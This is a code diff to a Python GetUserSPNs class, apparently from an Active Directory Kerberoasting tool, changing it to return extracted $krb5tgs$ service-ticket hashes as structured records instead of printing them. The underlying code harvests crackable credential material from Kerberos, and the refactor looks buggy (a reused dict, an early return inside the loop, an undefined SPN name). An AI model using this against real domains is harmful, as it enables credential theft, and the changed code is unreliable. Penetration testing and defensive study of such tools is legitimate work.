@@ -184,37 +184,25 @@ class GetUserSPNs:
                 constants.EncryptionTypes.rc4_hmac.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
-            if fd is None:
-                print(entry)
-            else:
-                fd.write(entry+'\n')
+            return entry
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                 constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
-            if fd is None:
-                print(entry)
-            else:
-                fd.write(entry+'\n')
+            return entry
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
             entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                 constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
-            if fd is None:
-                print(entry)
-            else:
-                fd.write(entry+'\n')
+            return entry
         elif decodedTGS['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
             entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                 constants.EncryptionTypes.des_cbc_md5.value, username, decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                 hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
-            if fd is None:
-                print(entry)
-            else:
-                fd.write(entry+'\n')
+            return entry
         else:
             logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                 decodedTGS['ticket']['sname']['name-string'][0], decodedTGS['ticket']['sname']['name-string'][1],
@@ -230,11 +218,14 @@ class GetUserSPNs:
                 target = self.__targetDomain
 
         answers = []
-        logging.debug('Total of records returned %d' % len(entries))
+        entries_out = []
+        entry_out = {}
 
+        logging.debug('Total of records returned %d' % len(entries))
         for entry in entries:
             mustCommit = False
             sAMAccountName =  ''
+            dn = entry.entry_dn
             memberOf = ''
             SPNs = []
             pwdLastSet = ''
@@ -243,6 +234,7 @@ class GetUserSPNs:
             delegation = ''
             try:
                 item = json.loads(entry.entry_to_json())
+                entry_out['attributes'] = {'distinguishedName':dn}
                 for attribute,value in item['attributes'].items():
                     if str(attribute) == 'sAMAccountName':
                         sAMAccountName = str(value[0])
@@ -258,7 +250,6 @@ class GetUserSPNs:
                     elif str(attribute) == 'servicePrincipalName':
                         for spn in value:
                             SPNs.append(str(spn))
-
                 if mustCommit is True:
                     if int(userAccountControl) & UF_ACCOUNTDISABLE:
                         logging.debug('Bypassing disabled account %s ' % sAMAccountName)
@@ -290,13 +281,19 @@ class GetUserSPNs:
                                                                                 self.__kdcHost,
                                                                                 TGT['KDC_REP'], TGT['cipher'],
                                                                                 TGT['sessionKey'])
-                        self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, self.__targetDomain + "/" + sAMAccountName)
+                        sess_key = self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName, self.__targetDomain + "/" + sAMAccountName)
+                        entry_out['attributes'] = {'sAMAccountName': sAMAccountName,
+                                               'servicePrincipalName': SPN,
+                                               'Hash': sess_key
+                                               }
+                        entries_out.append(entry_out)
                     except Exception as e:
                         logging.debug("Exception:", exc_info=True)
                         logging.error('Principal: %s - %s' % (downLevelLogonName, str(e)))
+            return entries_out
 
         else:
-            print("No entries found!")
+            logging.error("No entries found!")
 
     def request_users_file_TGSs(self):
 
